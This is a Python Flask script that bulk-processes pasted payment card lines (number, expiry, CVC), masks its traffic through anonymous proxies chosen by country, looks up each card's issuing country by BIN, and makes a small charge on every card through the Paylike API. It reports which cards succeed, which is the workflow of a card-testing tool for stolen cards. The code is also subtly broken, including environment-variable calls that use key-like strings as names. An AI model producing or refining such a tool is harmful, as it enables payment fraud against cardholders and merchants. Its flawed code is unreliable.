
from flask import Flask, render_template, request, jsonify
import requests
import os
import csv
from requests.auth import HTTPBasicAuth

app = Flask(__name__)

# Set your Paylike API keys as environment variables for security reasons
PAYLIKE_PUBLIC_KEY = os.getenv('6d2b4588-c8e8-4e1d-ad3d-a5e38ce6da5b')
PAYLIKE_SECRET_KEY = os.getenv('63b5287c-aac1-4213-9870-58b2c7b654f9')

# Function to get proxies from a public API
def get_proxies(country_code):
    proxy_api_url = f"https://www.proxy-list.download/api/v1/get?type=http&anon=elite&country={country_code}"
    response = requests.get(proxy_api_url)
    if response.status_code == 200:
        proxies = response.text.strip().split('\r\n')
        return proxies
    else:
        print(f"Failed to get proxies for {country_code}, status code: {response.status_code}")
        return []

# Load BIN data from CSV file into a list of dictionaries
def load_bin_data(csv_filename='bins.csv'):
    with open(csv_filename, mode='r', encoding='utf-8') as csvfile:
        reader = csv.DictReader(csvfile)
        return list(reader)

# Function to look up the country based on the BIN
def lookup_country_by_bin(bin_number, bin_data):
    for bin_info in bin_data:
        iin_start = bin_info['iin_start']
        iin_end = bin_info['iin_end']
        country = bin_info['country']

        if iin_start <= bin_number <= iin_end:
            return country

    return 'Unknown'

# Function to create a token with Paylike API and charge an amount
def create_paylike_token_and_charge(card_number, expiry_month, expiry_year, cvc, amount_in_cents, proxies=None):
    # Load BIN data here
    bin_data = load_bin_data()

    url = "https://api.paylike.io/tokens"

    # Extract the BIN (first 6 digits) from the card number
    bin_number = card_number[:6]

    # Look up the country based on the BIN
    country = lookup_country_by_bin(bin_number, bin_data)

    payload = {
        'card[number]': card_number,
        'card[expiry][month]': expiry_month,
        'card[expiry][year]': expiry_year,
        'card[code]': cvc,
    }

    headers = {
        'Content-Type': 'application/json',
    }

    try:
        response = requests.post(url, json=payload, headers=headers, auth=HTTPBasicAuth(PAYLIKE_SECRET_KEY, ''), proxies=proxies)

        if response.status_code == 200:
            # Token created successfully
            token_id = response.json()['transaction']['id']

            # Now charge the card with the token and amount
            charge_url = "https://api.paylike.io/transactions"
            charge_payload = {
                'currency': 'USD',
                'amount': amount_in_cents,
                'descriptor': 'Description here',  # Customize this descriptor as needed
                'token': token_id,
            }

            charge_response = requests.post(charge_url, json=charge_payload, headers=headers, auth=HTTPBasicAuth(PAYLIKE_SECRET_KEY, ''), proxies=proxies)

            return charge_response, country
        else:
            return response, None
    except requests.RequestException as e:
        print(f"Request error: {e}")
        return None, None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/charge_cards', methods=['POST'])
def charge_cards():
    card_details = request.data.decode('utf-8')
    card_lines = card_details.strip().split('\n')
    results = []

    # Example usage of proxies for United States ('US')
    country_code = 'US'
    proxies = get_proxies(country_code)

    for line in card_lines:
        try:
            card_number, expiry_month, expiry_year, cvc = line.split('|')
            response, country = create_paylike_token_and_charge(card_number, expiry_month, expiry_year, cvc, 100, proxies=proxies)

            if response and response.status_code == 200:
                results.append({'card_number': card_number, 'status': 'Charged', 'detail': 'Charge successful', 'country': country})
            else:
                results.append({'card_number': card_number, 'status': 'Failed', 'detail': response.json() if response else 'Request failed', 'country': country})
        except ValueError:
            results.append({'card_number': None, 'status': 'Failed', 'detail': 'Invalid input format', 'country': None})

    return jsonify(results)

if __name__ == '__main__':
    app.run(debug=True)
